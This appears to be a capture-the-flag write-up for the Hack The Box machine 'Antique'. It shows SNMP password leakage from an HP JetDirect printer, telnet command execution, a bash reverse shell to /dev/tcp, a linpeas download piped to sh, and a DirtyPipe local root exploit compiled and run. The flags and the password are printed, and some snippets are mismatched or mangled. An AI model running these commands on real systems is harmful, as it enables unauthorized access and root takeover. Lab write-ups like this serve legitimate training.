# Antique

### Challenge: FullPWN

### Tools: Nmap, telnet, SNMP

Starting off with our nmap scan we find ports 23 and 161.

```console
└──╼ [★]$ nmap -sC -A -p 161,23 10.129.86.189
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-11 21:36 BST
Nmap scan report for 10.129.86.189
Host is up (0.012s latency).

PORT    STATE  SERVICE VERSION
23/tcp  open   telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
161/tcp open   snmp     SNMPv1 server (public)
```

If we try logging into telnet we can see we need a password. luckily HP jetDirect has a vulnerability associated with SNMP.

```console
└──╼ [★]$ telnet 10.129.86.189
Trying 10.129.86.189...
Connected to 10.129.86.189.
Escape character is '^]'.

HP JetDirect

Password: 
Invalid password
Connection closed by foreign host.
```
Running SNMP walk shows its a printer and confirms the relation to telnet. next we change the command a bit to get back a password.

```
└──╼ [★]$ snmpwalk -v 1 -c public 10.129.86.189
iso.3.6.1.2.1 = STRING: "HTB Printer"
```

Converting that hex string gives us the password "P@ssw0rd@123!!123" now we can try loggin into telnet.

```console
└──╼ [★]$ snmpwalk -v 1 -c public 10.129.86.189 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
```
Nice now we are in as lpadmin and can get the user flag! Next we need to figure out how to privlege escalate.

```console
└──╼ [★]$ telnet 10.129.86.189
Trying 10.129.86.189...
Connected to 10.129.86.189.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> id
Err updating configuration
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
> 
```
```console
> exec cat user.txt
e8b892894bb1678349dd26804cc892bf
```
Set up a listner and then we can execute this bash shell to give us a pretty good shell. Now we are going to run linpeas, I had issues with the telnet shell but after creating this new shell I was able to get and run it much easier.

```console
└──╼ [★]$ nc -lvnp 6789
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::6789
Ncat: Listening on 0.0.0.0:6789
```
```console
> exec bash -c 'bash -i >& /dev/tcp/10.10.14.93/1234 0>&1'
```
We are goin to use these commands taken from the linpeas github site.

```console
sudo nc -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim
```
linpeas outputs alot of information but these 3 CVE are most notable. It also mentions cups 1.6.1 but I did not go that route.

```console
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Vulnerable to CVE-2021-3560

Vulnerable to CVE-2022-0847
```

After testing all 3 I finally had some luck with this one. https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit The other were giving me issues and breaking my shell.

So we are going to navigate to /tmp and since we cannot get files on the system we can just copy and paste the exploit into our own file using ```echo 'EXPLOIT GOES HERE' > exploit.c```
NOTE: After copying and pasting the shell looks a little messed up and should look something like what is directly below. So just add the ```' > exploit.c``` and it will work fine.

```console
> <Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
>                 "cp /tmp/passwd.bak /etc/passwd;"
>                 "echo \\\"Done! Popping shell... (run commands now)\\\";"
>                 "/bin/sh;"
>             "\" root"};
>         execv("/bin/sh", argv);
> 
>         printf("system() function call seems to have failed :(\n");
> return EXIT_SUCCESS;
> ' > exploit.c
```

I confirm the file is created.

```console
lp@antique:/tmp$ ls
ls
exp
exp.c
exploit.c
f
passwd.bak
solve.py
systemd-private-c5358880a0c8457890ce1682cb985ba6-systemd-logind.service-8gv78i
systemd-private-c5358880a0c8457890ce1682cb985ba6-systemd-timesyncd.service-tXY3Ah
tmux-7
vmware-root_872-2697532841
```
Then I compile and run it.

```console
lp@antique:/tmp$ gcc exploit.c -o exploit
gcc exploit.c -o exploit
lp@antique:/tmp$ ./exploit
./exploit
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "aaron"...
system() function call seems to have failed :(
lp@antique:/tmp$ su root
su root
Password: aaron
```

The exploit works and we get the flag!!!

```console
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
3573f881d294e079a4d1141e1e8c1626
```

This is not the only method. I'm sure the other CVE's could have worked and The Cups 1.6.1 read file from root exploit is also confirmed to work. Also there was another version of the same CVE that I used that nearly worked but it wanted me to input a password that I did not have. Luckily I saw this one that came with a password.

GG!
